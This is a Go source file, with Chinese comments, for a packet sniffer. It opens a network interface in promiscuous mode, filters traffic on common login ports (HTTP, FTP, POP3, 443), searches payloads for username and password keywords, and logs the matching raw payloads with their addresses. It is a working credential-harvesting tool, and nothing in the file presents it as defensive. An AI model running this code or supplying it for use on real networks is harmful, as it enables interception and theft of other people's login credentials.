package sniffer

import (
	"bytes"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"sync"
)

var (
	// 定义过滤规则，捕获常见的登录端口
	filter = "tcp and (dst port 80 or dst port 8080 or dst port 21 or dst port 443 or dst port 110)"

	// 定义要检测的用户名和密码关键词
	userFields = []string{"user", "username", "login", "login_user", "manager", "user_name", "usr", "email"}
	passFields = []string{"pass", "password", "login_pass", "pwd", "passwd"}
)

type PacketSniffer struct {
	handle   *pcap.Handle
	stopChan chan struct{}
	wg       sync.WaitGroup
}

func NewPacketSniffer(ifaceName string) (*PacketSniffer, error) {
	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("打开网卡失败: %v", err)
	}

	if err := handle.SetBPFFilter(filter); err != nil {
		handle.Close()
		return nil, fmt.Errorf("设置BPF过滤器失败: %v", err)
	}

	return &PacketSniffer{
		handle:   handle,
		stopChan: make(chan struct{}),
	}, nil
}

func (s *PacketSniffer) Start() {
	s.wg.Add(1)
	go s.sniffPackets()
}

func (s *PacketSniffer) Stop() {
	close(s.stopChan)
	s.wg.Wait()
	s.handle.Close()
}

func (s *PacketSniffer) sniffPackets() {
	defer s.wg.Done()
	packetSource := gopacket.NewPacketSource(s.handle, s.handle.LinkType())
	for {
		select {
		case <-s.stopChan:
			return
		case packet := <-packetSource.Packets():
			if packet != nil {
				s.processPacket(packet)
			}
		}
	}
}

func (s *PacketSniffer) processPacket(packet gopacket.Packet) {
	var fromIP, destIP, srcPort, destPort string

	if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
		ip := ipLayer.(*layers.IPv4)
		fromIP = ip.SrcIP.String()
		destIP = ip.DstIP.String()
	}

	if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
		tcp := tcpLayer.(*layers.TCP)
		srcPort = tcp.SrcPort.String()
		destPort = tcp.DstPort.String()
	}

	if appLayer := packet.ApplicationLayer(); appLayer != nil {
		payload := appLayer.Payload()

		// 检查是否包含用户名或密码信息
		if field, ok := checkCredentials(payload); ok {
			log.Printf("\n[发现敏感信息] %s:%s -> %s:%s\n", fromIP, srcPort, destIP, destPort)
			log.Printf("类型: %s\n数据: %s\n", field, string(payload))
		}
	}
}

func checkCredentials(payload []byte) (string, bool) {
	payloadLower := bytes.ToLower(payload)

	// 检查用户名字段
	for _, field := range userFields {
		if bytes.Contains(payloadLower, []byte(field)) {
			return "用户名", true
		}
	}

	// 检查密码字段
	for _, field := range passFields {
		if bytes.Contains(payloadLower, []byte(field)) {
			return "密码", true
		}
	}

	return "", false
}
